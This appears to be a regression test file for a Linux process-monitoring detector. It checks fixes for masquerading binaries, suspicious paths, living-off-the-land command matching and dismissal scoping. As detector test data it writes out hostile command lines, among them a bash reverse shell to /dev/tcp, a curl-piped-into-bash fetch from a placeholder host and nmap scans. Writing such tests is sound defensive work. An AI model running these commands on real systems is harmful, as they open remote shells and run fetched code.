"""
tests/test_process_monitor_linux.py, the PM round's regression file.

2026-09-23. bugfinder.md's section "THE PROCESS MONITOR ON LINUX, CAPABILITY
ROUND" measured thirteen defects (PM-1..PM-13) against
tools/process_monitor_linux.py and the pages that read it. This file asserts
the fixes, BOTH DIRECTIONS wherever a detector is involved: a detector that
stops firing is as broken as one that fires on everything.

WHAT IT DOES NOT DO: it does not touch the owner's database to write, it does
not need root, and it does not plant anything outside a throwaway directory it
creates and removes itself. The processes it starts to prove the argv[0] and
masquerade cases are copies of /bin/sleep in /tmp, killed in a finally block.

Runs on Linux. On anything else it skips, which is a result and not a pass.
"""
import os
import pathlib
import shutil
import subprocess
import sys
import tempfile
import time

ROOT = pathlib.Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))
sys.path.insert(0, str(pathlib.Path(__file__).resolve().parent))
import _isolate_db                                  # noqa: E402
_isolate_db.isolate()

fails = []


def check(label, got, want):
    ok = got == want
    print(f"  {'PASS' if ok else 'FAIL'}  {label}: {got!r}"
          + ("" if ok else f"  (want {want!r})"))
    if not ok:
        fails.append(label)


def check_true(label, got):
    ok = bool(got)
    print(f"  {'PASS' if ok else 'FAIL'}  {label}: {got!r}")
    if not ok:
        fails.append(label)


if os.name != "posix":
    print("SKIP: this file measures a Linux process table and this is not "
          "Linux. That is a skip, not a pass.")
    sys.exit(1)

import psutil                                       # noqa: E402
from tools import process_monitor_linux as pm       # noqa: E402

TMP = pathlib.Path(tempfile.mkdtemp(prefix="pmround.", dir="/tmp"))


def _plant(dest_name, argv0=None):
    """
    A copy of /bin/sleep in a throwaway dir, started.

    argv0, when given, is a LIE the process tells about itself: the kernel
    executes `path` while argv[0] says something else. That is the exact shape
    PM-2 is about, and `executable=` is the only way to build it.
    """
    path = TMP / dest_name
    path.parent.mkdir(parents=True, exist_ok=True)
    shutil.copy("/bin/sleep", path)
    os.chmod(path, 0o755)
    if argv0:
        proc = subprocess.Popen([argv0, "20"], executable=str(path))
    else:
        proc = subprocess.Popen([str(path), "20"])
    time.sleep(0.35)
    return proc, path


print("\n[1] PM-2: the name-based checks read the FILE, not the process's claim")

# THE DEFECT, re-measured. psutil's name() extends the kernel's 15-character
# comm out of the process's OWN argv[0], so the field the rules matched was
# partly chosen by the process being judged. Measured before the fix: a
# 23-character offensive-tool binary running from /tmp passed through
# untouched when argv[0] lied.
proc, planted = _plant("linux-exploit-suggester")
try:
    row = pm._get_process_info(psutil.Process(proc.pid))
    check("the kernel's own path is read", row["exe"], str(planted))
    check("and the name the rules use is the FILE's", pm._true_name(row),
          "linux-exploit-suggester")
    types = [f["type"] for f in pm._analyze_process(row)]
    check_true("the offensive-tool name is caught now",
               "suspicious_process_name" in types)
finally:
    proc.kill()
    proc.wait()

# THE CONTROL: an ordinary tool whose binary is honestly named is NOT flagged.
proc, planted = _plant("sleep-is-ordinary")
try:
    row = pm._get_process_info(psutil.Process(proc.pid))
    check("and an ordinary file name is not flagged",
          [f["type"] for f in pm._analyze_process(row)],
          ["suspicious_process_location"])
finally:
    proc.kill()
    proc.wait()

# AND THE SHAPE THE DEFECT DESCRIBED, straight: argv[0] lies, the file does
# not. This is the case the old code lost. `executable=` is what makes the
# lie: the process IS the planted file and its argv[0] claims to be sleep.
proc, planted = _plant("lying/linux-exploit-suggester", argv0="/usr/bin/sleep")
try:
    row = pm._get_process_info(psutil.Process(proc.pid))
    check("the kernel says which file is really running", row["exe"],
          str(planted))
    check("and the rules read the file, not the claim", pm._true_name(row),
          "linux-exploit-suggester")
    # ONE analysis call, kept: _analyze_process registers the (pid, create_time)
    # instance on its first look, so a second call for the same row correctly
    # returns [] — that is the PID-reuse dedup, not a miss.
    types = [f["type"] for f in pm._analyze_process(row)]
    check_true("so the offensive-tool name is caught even with a lying argv[0]",
               "suspicious_process_name" in types)
    check_true("and the location rule still sees the throwaway directory",
               "suspicious_process_location" in types)
finally:
    proc.kill()
    proc.wait()


print("\n[2] PM-1: the masquerading rule asks what its own text says it asks")

# The three files the live database holds 84 HIGH findings about. The page's
# own checker (the dpkg basis) reports all three Valid; the rule fired anyway.
for name, path in (("systemd", "/usr/lib/systemd/systemd"),
                   ("systemd-journald", "/usr/lib/systemd/systemd-journald"),
                   ("systemd-logind", "/usr/lib/systemd/systemd-logind")):
    got = pm._masquerade_verdict(name, path)
    check(f"{path} is not a masquerade", got, (False, None))

# /usr/libexec is where this machine's daemons run and it was missing from the
# old list too.
check("and a daemon in /usr/libexec is not one either",
      pm._masquerade_verdict("dbus-daemon", "/usr/libexec/dbus-daemon"),
      (False, None))

# AND A REAL ONE STILL FIRES. This is the whole point: the fix must not have
# traded a false positive for a false negative.
proc, planted = _plant("systemd")
try:
    row = pm._get_process_info(psutil.Process(proc.pid))
    findings = {f["type"]: f for f in pm._analyze_process(row)}
    check_true("a real /tmp/systemd is caught",
               "masquerading_system_binary" in findings)
    check("at high severity",
          (findings.get("masquerading_system_binary") or {}).get("severity"),
          "high")
    check_true("and the row names the file",
               str(planted) in
               (findings.get("masquerading_system_binary") or {}).get(
                   "description", ""))
finally:
    proc.kill()
    proc.wait()

# The rule's stated basis: a system-named binary whose digest does NOT match
# its package is a masquerade wherever it sits. Driven with the answer the
# package check would give, because a tampered /usr/bin file is not something
# a test can create on a live host.
tampered = pm._masquerade_verdict(
    "systemd", "/usr/lib/systemd/systemd",
    {"status": "HashMismatch", "package": "systemd", "kind": "package"})
check("a system-named file that is NOT its package's is a masquerade",
      tampered[0], True)
check_true("and the sentence names the package",
           "systemd" in tampered[1] and "digest" in tampered[1])
# The control for that branch: the same path, the answer Valid.
check("and the same path with a matching digest is not",
      pm._masquerade_verdict("systemd", "/usr/lib/systemd/systemd",
                             {"status": "Valid", "package": "systemd"}),
      (False, None))


print("\n[3] PM-2b: the name is matched on argument boundaries, not substrings")

# THE FALSE POSITIVES THAT PRODUCED 37 LIVE ROWS. "nc" is inside "sync",
# "launcher" and "commit"; "-i" is a flag on half the GNU tools in existence.
# Every one of these matched before the fix.
FALSE_ONES = [
    ("bash", "bash -c 'sync; echo done'"),
    ("bash", "git commit -m 'sync the config'"),
    ("bash", "bash -c rc=0; \"$1\" \"${@:2}\" || rc=$?; "
             "/home/x/agentalsec/scripts/agental_sec_launch.sh --elevated"),
    ("bash", "bash -c 'grep -i pattern file'"),
    ("bash", "bash -c 'sed -i s/a/b/ f'"),
    ("bash", "bash -c 'curl -s url'"),
]
for name, cmd in FALSE_ONES:
    check(f"{cmd[:44]!r} no longer fires", pm._check_lolbin(name, cmd),
          (False, None))

# AND THE TRUE POSITIVES STILL DO. A detector that stops firing is as broken
# as one that fires on everything.
TRUE_ONES = [
    ("bash", "bash -i", "-i"),
    ("bash", "bash -i >& /dev/tcp/203.0.113.9/4444 0>&1", "-i"),
    ("bash", "/bin/bash -i", "-i"),
    ("nmap", "nmap -sV 192.0.2.0/24", "-sV"),
    ("nmap", "nmap -sVn -p1-100 192.0.2.9", "-sV"),
    ("curl", "curl -o /tmp/x.sh http://example.invalid/x", "-o /tmp/"),
]
for name, cmd, shown in TRUE_ONES:
    got = pm._check_lolbin(name, cmd)
    check(f"{cmd[:40]!r} still fires", got[0], True)
    check_true(f"  and it names the argument that matched ({shown})",
               shown in (got[1] or ""))

# THE BOUNDARY ITSELF, which is the difference between the two lists: a -i
# that belongs to sed is sed's flag and is not evidence about bash.
check("an interactive bash is a finding", pm._check_lolbin("bash", "bash -i")[0],
      True)
check("but a -i handed to sed inside the script is not",
      pm._check_lolbin("bash", "bash -c 'sed -i s/a/b/ f'")[0], False)
check("and the same for grep",
      pm._check_lolbin("bash", "bash -c 'grep -i x'")[0], False)
# A path pattern is still allowed to be a literal, where it cannot occur in
# ordinary English.
check("bash's own /dev/tcp redirection still fires",
      pm._check_lolbin("bash", "bash -c 'cat < /dev/tcp/1.2.3.4/80'")[0], True)
check("and a curl piped into bash still fires",
      pm._check_lolbin("bash", "curl http://example.invalid/x | bash")[0],
      True)
# A pattern that is neither a token nor a path is a bug in the table, loudly.
try:
    pm._match_pattern("just a string", [], "")
    check("a bare string pattern is refused", "no error", "ValueError")
except ValueError:
    check("a bare string pattern is refused", "ValueError", "ValueError")


print("\n[4] PM-8: the globs are globs, and the label names the real folder")

check("/home/<user>/Downloads/evil.sh is caught",
      pm._is_suspicious_path("/home/ada/Downloads/evil.sh")[0], True)
check("and a user cache is caught",
      pm._is_suspicious_path("/home/ada/.cache/implant")[0], True)
check("and root's cache is caught",
      pm._is_suspicious_path("/root/.cache/x")[0], True)

# THE LABEL, which was wrong: /tmp/ was tried before /var/tmp/ and returned
# the first match, so a file in /var/tmp was reported as being in /tmp.
check("a /var/tmp file says /var/tmp",
      pm._is_suspicious_path("/var/tmp/y")[1],
      "Running from suspicious location: /var/tmp/")
check("and a /tmp file says /tmp",
      pm._is_suspicious_path("/tmp/x")[1],
      "Running from suspicious location: /tmp/")
check("and /dev/shm says /dev/shm",
      pm._is_suspicious_path("/dev/shm/z")[1],
      "Running from suspicious location: /dev/shm/")

# THE BOUNDARY CONTROL: a directory whose NAME merely contains the marker is
# not that directory.
check("a folder named Downloads-archive is not a Downloads folder",
      pm._is_suspicious_path("/home/ada/Downloads-archive/x")[0], False)
check("a trusted path stays trusted",
      pm._is_suspicious_path("/usr/bin/ls"), (False, None))


print("\n[5] PM-4/PM-13: every field in its own try, one sleep per pass")

# THE DEFECT, re-measured. Before the fix: 226 enumerated, 81 rows, 145 lost
# to one block-level try, and the command line — readable on 226 of 226 — went
# with the refused exe.
#
# THE TIMING CHECK WAS RESTATED 2026-09-25, AND THE REASON IS WORTH THE SPACE.
#
# It used to be `elapsed < 4.0` on ONE pass. That number was true when it was
# written and it is not a statement about the defect any more: this pass now
# batches one package-manager call for the whole process list
# (tools/process_monitor.signatures_for, the PM-1 masquerade basis), and
# dpkg-query's cost is a scan of its own file database -- about two seconds a
# call, the same for one path as for a thousand. So the FIRST pass on a cold
# cache is measured at 7.9 s on this host and every pass after it at 0.8-1.2 s,
# against 239 rows. The old check called that 8 seconds a regression in PM-13,
# which it is not: PM-13 was about a sleep taken ONCE PER PROCESS, inside
# psutil's cpu_percent, and the cost it describes scales with the number of
# processes.
#
# So the check now measures the thing PM-13 is actually about, and it measures
# it as a relationship rather than a stopwatch reading: N processes must not
# cost N sleeps. A per-process 0.1 s interval over this machine's process count
# is the number to beat, and the measured pass has to come in far under it.
# The one-time package batch is warm by then, and the FIRST pass's cost is
# PRINTED rather than asserted on, so a cold-cache number stays visible.
t0 = time.time()
res = pm.monitor_once()
first_pass = time.time() - t0

t0 = time.time()
res = pm.monitor_once()
elapsed = time.time() - t0

n = res["process_count"]
per_process_sleep_cost = n * pm.CPU_SAMPLE_INTERVAL
print(f"    {n} rows in {elapsed:.2f}s (first pass, cold package cache: "
      f"{first_pass:.2f}s), unreadable={res['unreadable_by_field']}")
print(f"    one sleep per process would have cost >= {per_process_sleep_cost:.1f}s")

check_true("every process gets a row", n > 150)
check_true(
    f"a pass costs a fraction of {n} per-process sleeps ({elapsed:.2f}s vs "
    f"{per_process_sleep_cost:.1f}s)",
    elapsed < per_process_sleep_cost / 4)
# AND THE STRUCTURE, so the property is asserted where it lives rather than
# only in a wall-clock number that a busy machine can move.
#
# THE BODY IS READ OUT OF THE PARSE TREE, not off the raw text, and that is the
# fix for the first draft of this check. The docstring of _get_all_processes
# QUOTES `cpu_percent(interval=0.1)` to explain why it is no longer called that
# way, so a text search finds the paragraph saying the defect is gone and
# reports the defect -- the same fault as a comment about a banned call failing
# the assertion that the call is not made. `ast` gives the STATEMENTS, which is
# what "the code does this" actually means.
import ast as _ast

_pml_src = (ROOT / "tools" / "process_monitor_linux.py").read_text(encoding="utf-8")
_fn = next(n for n in _ast.walk(_ast.parse(_pml_src))
           if isinstance(n, _ast.FunctionDef) and n.name == "_get_all_processes")
_body = _fn.body
if (_body and isinstance(_body[0], _ast.Expr)
        and isinstance(_body[0].value, _ast.Constant)
        and isinstance(_body[0].value.value, str)):
    _body = _body[1:]                       # drop the docstring, keep the code
_pass_code = "\n".join(_ast.unparse(stmt) for stmt in _body)
print(f"    the pass body is {len(_body)} statement(s), read from the parse tree")
check("the pass really is being read, not an empty slice",
      len(_body) > 5, True)
check("exactly one sleep in the whole pass",
      _pass_code.count("time.sleep("), 1)
check("and the per-process form is not called anywhere in it",
      "cpu_percent(interval=0.1)" in _pass_code, False)
check("while the non-blocking form is used, twice",
      _pass_code.count("cpu_percent(interval=None)"), 2)

# The refusals are COUNTED by field, so "how much of the machine did we read"
# is a number rather than a shrug.
check_true("the refusals are counted by field",
           isinstance(res["unreadable_by_field"], dict))

# THE COMMAND LINE SURVIVES A REFUSED EXE. This is the recovery PM-4 promised
# and it is measurable on any process this account does not own.
# With the read helper installed every refused exe is filled (PROC-6), so the
# helper is switched off here to measure the refusal itself.
_real_fill = pm._fill_exe_from_helper
pm._fill_exe_from_helper = lambda rows: {"asked": False, "filled": 0, "reason": None}
rows = pm._get_all_processes()
pm._fill_exe_from_helper = _real_fill
with_cmdline_no_exe = [r for r in rows if r["cmdline"] and not r["exe"]]
print(f"    rows with a command line but a refused exe: "
      f"{len(with_cmdline_no_exe)}")
check_true("a refused exe does not cost the command line",
           len(with_cmdline_no_exe) > 0)
one = with_cmdline_no_exe[0]
check_true("and the refusal is carried WITH the field, not swallowed",
           bool((one.get("unreadable") or {}).get("exe")))
check_true("  and it names the kernel's reason",
           "REFUSED" in (one["unreadable"]["exe"]))

# PM-3's fields, read unelevated on this host right now.
check_true("CapEff is read from /proc/<pid>/status",
           bool(pm._read_proc_status(os.getpid()).get("cap_eff")))
check("Seccomp is read", isinstance(
    pm._read_proc_status(os.getpid()).get("seccomp"), int), True)
check("NoNewPrivs is read", isinstance(
    pm._read_proc_status(os.getpid()).get("no_new_privs"), int), True)
check_true("and the cgroup unit is attributed",
           pm._read_cgroup_unit(os.getpid()) is not None)


print("\n[6] PM-12: the two counts are two different questions, and they say so")

status = pm.get_status()
check_true("get_status counts every process on the machine",
           status["process_count"] > 0)
check_true("and says what that number means",
           "EVERY process" in status["process_count_means"])
check_true("monitor_once says what ITS number means too",
           "NOT the number of processes on the machine"
           in res["process_count_means"])
# ONE TIME BASE. The registry tool used to format local time with no offset
# while this module used UTC with one, so the same process came back seven
# hours apart and neither said which clock it was on.
row = pm._get_process_info(psutil.Process(os.getpid()))
check_true("start times carry a UTC offset",
           (row["create_time"] or "").endswith("+00:00"))


print("\n[7] PM-11: the dead set is gone, and the live set is live")

# _hash_file raised NameError on every call and swallowed it into a debug
# line. The constant lives in this file now.
check("MAX_HASH_BYTES is defined HERE",
      hasattr(pm, "MAX_HASH_BYTES"), True)
check("with the Windows tree's own number",
      pm.MAX_HASH_BYTES, 256 * 1024 * 1024)
digest = pm._hash_file("/bin/ls")
check_true("so a hash comes back", isinstance(digest, str) and len(digest) == 64)
check("and the cache it fills holds it",
      any(v == digest for v in pm._hash_cache.values()), True)

# The enrichment beat: the old call was commented out AND named a function
# that does not exist. The module now calls the one that does.
src = (ROOT / "tools" / "process_monitor_linux.py").read_text(encoding="utf-8")
check("the enrichment import is used, not just imported",
      "enrichment.enqueue(" in src, True)
check("and the function that does not exist is not called",
      "queue_hash(" in src, False)
check("the unsatisfiable masquerade clause is gone",
      'endswith("/" + suspicious)' in src, False)

# The legacy kill path now refuses, because a second kill route with no pin
# and no unit check is a hole the moment somebody calls it.
k = pm.kill_process(1)
check("the legacy kill refuses by default", k.get("refused"), True)
check_true("and it sends the caller to the real one",
           "LinuxRemediation" in (k.get("error") or ""))
check("while the flag that would allow it is off", pm.ALLOW_LEGACY_KILL, False)


print("\n[8] PM-5/PM-6: the finding says WHERE the tool is and WHAT it is")

# PM-6: the same name from /usr/bin (an installed package) and from /tmp (no
# package at all) must not read as the same fact.
proc, planted = _plant("nc")
try:
    row = pm._get_process_info(psutil.Process(proc.pid))
    f = [f for f in pm._analyze_process(row)
         if f["type"] == "suspicious_process_name"][0]
    check("the finding carries the path", f.get("exe"), str(planted))
    check("and the package, which is None for a /tmp copy",
          f.get("package"), None)
    check_true("and the sentence says an unowned tool is the fact",
               "no installed package" in f["description"])
finally:
    proc.kill()
    proc.wait()

# The other direction, on a real installed binary this time.
installed = pm._package_owns("/usr/bin/nc")
print(f"    /usr/bin/nc is owned by: {installed!r}")
if installed:
    f = [f for f in pm._analyze_process(
        {"pid": 999999, "name": "nc", "exe": "/usr/bin/nc",
         "cmdline": "nc -l 4444", "create_time_ts": 1e9})]
    check_true("an INSTALLED offensive tooling package is said to be one",
               installed in f[0]["description"])
    check_true("and it is not described as unowned",
               "no installed package" not in f[0]["description"])


print("\n[9] PM-9: the Process page's own question, on THIS platform's paths")

from tools import process_monitor as reg           # noqa: E402

check("a temp drop is amber on Linux",
      reg.trust_of({"exe": "/tmp/x",
                    "signature": {"status": "Valid", "signer": "x"}})[0],
      "watch")
check_true("/dev/shm is nameable now, not silence",
           reg.odd_path_reason("/dev/shm/x") is not None)
check_true("and a user cache is too",
           reg.odd_path_reason("/home/user/.cache/x") is not None)
check("while an ordinary system path is not odd",
      reg.odd_path_reason("/usr/bin/ls"), None)
# THE LABEL CONTROL, the PM-8 shape one layer up.
check("a /var/tmp file is NOT labelled /tmp",
      reg.odd_path_reason("/var/tmp/y") == "a temp folder", False)
check("and a directory that merely starts with the letters is not /tmp",
      reg.odd_path_reason("/home/x/shipped/tool"), None)
# PM-9's other half: no Windows privilege-split sentence on a Linux path.
comparable, note = reg._resolve_path("/usr/bin/ls")
check("a Linux path is returned as it is", comparable, "/usr/bin/ls")
check("and carries no Windows note about a split that is not here", note, None)


print("\n[10] PM-3: the grey row says WHY, and says which rights it ran with")

table = reg.process_table(limit=400)
check("the table came back", table["available"], True)
check_true("and reports which rights produced it",
           table.get("elevated") in (True, False, None))
print(f"    {table['total']} rows: {table['counts']}, "
      f"elevated={table.get('elevated')}, "
      f"refusals={table.get('exe_refusals')}")

greys = [r for r in table["processes"] if r["trust"] == "unknown"]
print(f"    {len(greys)} grey rows")
if greys:
    reasons = [r.get("trust_reason") or "" for r in greys]
    check_true("no grey row claims the file is missing from the machine",
               all("no executable path on disk" not in x
                   and "nothing could be read about this one" not in x
                   for x in reasons))
    check_true("at least one names the kernel's refusal",
               any("REFUSED" in x or "PermissionError" in x
                   or "refused" in x for x in reasons))
else:
    print("    (no grey rows on this load — the refusal checks above still "
          "hold for the next load, and _exe_refusal_note is asserted directly)")
    check("the refusal note names the kernel, given a pid it cannot read",
          "REFUSED" in reg._exe_refusal_note(1, False), True)


print("\n[11] PM-7: a dismissal is scoped to the evidence it closed")

from core import memory_engine as me               # noqa: E402

# The four dismissals live in the OWNER's database and are read, never
# written, here. What is asserted is the RULE: same file quiet, different file
# loud. The isolated test database has no dismissals, so the rule is exercised
# against one created in the ISOLATED store this file runs against.
me.dismiss_entity("process", "pm7-fake-systemd",
                  reason="PM-7 regression")

# With nothing closed by it, the comparison cannot be made, and the honest
# answer is "still honoured, and not compared" rather than a false all-clear.
r = me.dismissal_covers("process", "pm7-fake-systemd", "/tmp/systemd")
check("a dismissal with no recorded file still honours itself",
      r["covered"], True)
check("and says the comparison could not be made", r["compared"], False)
check_true("and says so in words",
           "nothing to compare" in r["reason"])

# Now the same name, with a finding closed by it that NAMES a file.
# The sensor row has to exist first: findings.sensor_id is a foreign key and
# this file runs against a database built fresh from Schema.SQL.
me.upsert_sensor("sensor-test-local", "host", "everything", "nothing",
                 summary="the test's own sensor row")
me.save_finding(session_id="test", source="process_monitor",
                sensor_id="sensor-test-local",
                detection_id="LNX-1102", severity="high",
                entity_type="process", entity_value="pm7-fake-systemd",
                title="System binary running from untrusted path",
                description="planted", raw_data={"exe": "/usr/lib/systemd/systemd"})
me.dismiss_entity("process", "pm7-fake-systemd", reason="PM-7 regression")
r = me.dismissal_covers("process", "pm7-fake-systemd",
                        "/usr/lib/systemd/systemd")
check("the file it was made about is covered", r["covered"], True)
check("and the comparison WAS made this time", r["compared"], True)

# THE ONE THAT MATTERS: the same name at a DIFFERENT file is not covered.
r = me.dismissal_covers("process", "pm7-fake-systemd", "/tmp/systemd")
check("a DIFFERENT file is not covered by it", r["covered"], False)
check("and the answer says the comparison was made", r["compared"], True)
check_true("and it names both files",
           "/usr/lib/systemd/systemd" in r["reason"]
           and "/tmp/systemd" in r["reason"])

# The control: a name nobody dismissed.
r = me.dismissal_covers("process", "pm7-never-dismissed", "/tmp/x")
check("an entity with no dismissal is not covered", r["covered"], False)
check_true("and the reason says why", "no dismissal" in r["reason"])


print("\n[12] the adapter writes through the new gate")

ad = (ROOT / "adapters.py").read_text(encoding="utf-8")
check("the adapter asks dismissal_covers, not is_dismissed",
      "me.dismissal_covers(" in ad, True)
check("and does not decide a process finding by name alone any more",
      'if not me.is_dismissed("process", name):' in ad, False)


shutil.rmtree(TMP, ignore_errors=True)

print("\n" + ("ALL CHECKS PASSED" if not fails else f"FAILURES: {fails}"))
sys.exit(1 if fails else 0)
